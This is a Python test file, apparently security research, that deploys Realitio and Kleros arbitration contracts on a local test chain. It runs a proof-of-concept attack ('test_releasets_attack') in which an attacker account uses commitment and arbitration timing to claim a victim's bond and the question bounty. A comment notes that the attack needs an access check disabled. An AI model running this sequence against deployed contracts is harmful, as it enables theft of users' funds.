import unittest
from unittest import TestCase, main
from eth_utils import encode_hex, decode_hex
from ethereum.tools import tester as t
from ethereum.tools.tester import TransactionFailed
from ethereum.tools import keys
from sha3 import keccak_256

DEPLOY_GAS = 4500000

QINDEX_CONTENT_HASH = 0
QINDEX_ARBITRATOR = 1
QINDEX_OPENING_TS = 2
QINDEX_STEP_DELAY = 3
QINDEX_FINALIZATION_TS = 4
QINDEX_IS_PENDING_ARBITRATION = 5
QINDEX_BOUNTY = 6
QINDEX_BEST_ANSWER_ID = 7
QINDEX_HISTORY_HASH = 8
QINDEX_BOND = 9

# Additional convenience field in Realitio.sol:Question used to
# store answer or commitment id
pacamara_QINDEX_AOCI = 10

def calculate_commitment_hash(answer, nonce):
    return decode_hex(keccak_256(answer + decode_hex(hex(nonce)[2:].zfill(64))).hexdigest())

def calculate_commitment_id(question_id, answer_hash, bond):
    return decode_hex(keccak_256(question_id + answer_hash + decode_hex(hex(bond)[2:].zfill(64))).hexdigest())

def to_answer_for_contract(txt):
    # to_answer_for_contract(("my answer")),
    return decode_hex(hex(txt)[2:].zfill(64))

class TestKlerosCommitmentTimeoutTampering(TestCase):
    def setUp(self):
        self.c = t.Chain()

        realitio_code = open('Realitio.sol').read()
        arb_code_raw = open('Arbitrator.sol').read()
        owned_code_raw = open('Owned.sol').read()
        client_code_raw = open('CallbackClient.sol').read()
        reg_arb_code_raw = open('RegisteredWalletArbitrator.sol').read()
        exploding_client_code_raw = open('ExplodingCallbackClient.sol').read()
        self.c.mine()

        safemath = open('RealitioSafeMath256.sol').read()
        safemath32 = open('RealitioSafeMath32.sol').read()
        balance_holder = open('BalanceHolder.sol').read()
        realitio_code = realitio_code.replace("import './RealitioSafeMath256.sol';", safemath);
        realitio_code = realitio_code.replace("import './RealitioSafeMath32.sol';", safemath32);
        realitio_code = realitio_code.replace("import './BalanceHolder.sol';", balance_holder);

        self.rc_code = realitio_code
        arb_code_raw = arb_code_raw.replace("import './Owned.sol';", owned_code_raw);
        arb_code_raw = arb_code_raw.replace("import './Realitio.sol';", realitio_code);

        self.arb_code = reg_arb_code_raw.replace("import './Arbitrator.sol';", arb_code_raw)

        self.client_code = client_code_raw
        self.exploding_client_code = exploding_client_code_raw

        self.c.mine()
        self.rc0 = self.c.contract(self.rc_code, language='solidity', sender=t.k0, startgas=DEPLOY_GAS)

        self.c.mine()
        self.s = self.c.head_state

        self.setUpRealitioArbitratorProxy(realitio_code)
        self.c.mine()

        self.question_id = self.rc0.askQuestion(
            0,
            "my question",
            self.centarb0.address,
            120,
            0,
            0,
            value=1000
        )

        ts = self.s.timestamp
        self.s = self.c.head_state

        question = self.rc0.questions(self.question_id)
        self.assertEqual(int(question[QINDEX_FINALIZATION_TS]), 0)
        self.assertEqual(decode_hex(question[QINDEX_ARBITRATOR][2:]), self.centarb0.address)

        self.assertEqual(question[QINDEX_STEP_DELAY], 120)
        self.assertEqual(question[QINDEX_BOUNTY], 1000)


    def setUpRealitioArbitratorProxy(self,realitio_code):        
        self.proxy_code = open('../../../kleros-interaction/contracts/standard/proxy/RealitioArbitratorProxy.sol').read()
        kleros_arbitrable = open('../../../kleros-interaction/contracts/standard/arbitration/Arbitrable.sol').read()
        kleros_iarbitrable = open('../../../kleros-interaction/contracts/standard/arbitration/IArbitrable.sol').read()
        kleros_arbitrator = open('../../../kleros-interaction/contracts/standard/arbitration/Arbitrator.sol').read()

        kleros_all3 = kleros_iarbitrable + kleros_arbitrable + kleros_arbitrator 
        kleros_all3 = kleros_all3.replace("import \"./Arbitrable.sol\";", "");
        kleros_all3 = kleros_all3.replace("import \"./Arbitrator.sol\";", "");
        kleros_all3 = kleros_all3.replace("import \"./IArbitrable.sol\";", "");

        self.proxy_code = self.proxy_code.replace("import { Realitio } from \"@realitio/realitio-contracts/truffle/contracts/Realitio.sol\";", realitio_code);
        self.proxy_code = self.proxy_code.replace("import { Arbitrable, Arbitrator } from \"../arbitration/Arbitrable.sol\";", kleros_all3);

        kleros_cent_arb = open('../../../kleros-interaction/contracts/standard/arbitration/CentralizedArbitrator.sol').read()
        kleros_cent_arb = kleros_cent_arb.replace("import \"./Arbitrator.sol\";", kleros_all3);
        
        try:
          args_arb_price=[0]
          self.centarb0 = self.c.contract(kleros_cent_arb, args_arb_price, 
                                          language='solidity', sender=t.k0, startgas=DEPLOY_GAS)
          self.c.mine()

          extra_data = b''
          args_proxy=[self.centarb0.address, extra_data, self.rc0.address] 
          self.proxy0 = self.c.contract(self.proxy_code, args_proxy,
                                        language='solidity', sender=t.k0, startgas=DEPLOY_GAS)
          self.c.mine()
          print("self.proxy0=" + str(self.proxy0) + " self.centarb0=" + str(self.centarb0))
        except Exception as ex:
          print("exception: ex=" + str(ex))
          exit()


    # k0=questioner creator
    # k1=arbitrator
    # k3=attacker
    # k4=victim
    def test_releasets_attack(self):
        question = self.rc0.questions(self.question_id)
        self.assertEqual(question[QINDEX_BOUNTY], 1000)

        st = None
        st = self.submitAnswerReturnUpdatedState( st, self.question_id, 1002, 4, 8, t.k3)
        st = self.submitAnswerReturnUpdatedState( st, self.question_id, 1001, 8, 16, t.k4, True)

        self.proxy0.increaseBlockTime(15)
        self.c.mine()
          
        # Requires disabling onlyArbitrator(question_id) check in Realitio.notifyOfArbitrationRequest
        self.proxy0.requestArbitration(self.question_id,0, startgas=200000, sender=t.k3)

        st['hash'].insert(0, self.rc0.questions(self.question_id)[QINDEX_HISTORY_HASH])
        st['bond'].insert(0, 0) # zero bond for arbitrator answer
        st['answer'].insert(0, b'')
        st['addr'].insert(0, keys.privtoaddr(t.k3)) # Due to successful attack, will be k3
        
        # _questionID, _lastHistoryHash, _lastAnswerOrCommitmentID, _lastBond, _lastAnswerer, _isCommitment
        self.proxy0.reportAnswer(self.question_id,
                                 st['hash'][1],
                                 self.rc0.questions(self.question_id)[pacamara_QINDEX_AOCI],
                                 16,
                                 keys.privtoaddr(t.k4),
                                 True,
                                 sender=t.k1)

        self.rc0.claimWinnings(self.question_id, st['hash'], st['addr'], st['bond'], st['answer'], startgas=400000, sender=t.k3)
        self.assertEqual(self.rc0.balanceOf(keys.privtoaddr(t.k3)), 8+16+1000)


    def submitAnswerReturnUpdatedState(self, st, qid, ans, max_last, bond, sdr, is_commitment = False, is_arbitrator = False, skip_sender = False):
        if st is None:
            st = {
                'addr': [],
                'bond': [],
                'answer': [],
                'hash': [],
                'nonce': [], # only for commitments
            }
        st['hash'].insert(0, self.rc0.questions(qid)[QINDEX_HISTORY_HASH])
        st['bond'].insert(0, bond)
        st['answer'].insert(0, to_answer_for_contract(ans))
        st['addr'].insert(0, keys.privtoaddr(sdr))
        nonce = None
        if is_commitment:
            nonce = 1234
            answer_hash = calculate_commitment_hash(to_answer_for_contract(ans), nonce)
            commitment_id = calculate_commitment_id(self.question_id, answer_hash, bond)
            if skip_sender:
                self.rc0.submitAnswerCommitment(qid, answer_hash, max_last, 0x0, value=bond, sender=sdr)
            else:
                self.rc0.submitAnswerCommitment(qid, answer_hash, max_last, keys.privtoaddr(sdr), value=bond, sender=sdr)
            st['answer'][0] = commitment_id
        else:
            if is_arbitrator:
                self.arb0.submitAnswerByArbitrator(qid, to_answer_for_contract(ans), 0, 0, keys.privtoaddr(sdr), startgas=200000)
            else:
                self.rc0.submitAnswer(qid, to_answer_for_contract(ans), max_last, value=bond, sender=sdr)
        st['nonce'].insert(0, nonce)
        return st

if __name__ == '__main__':
    main()
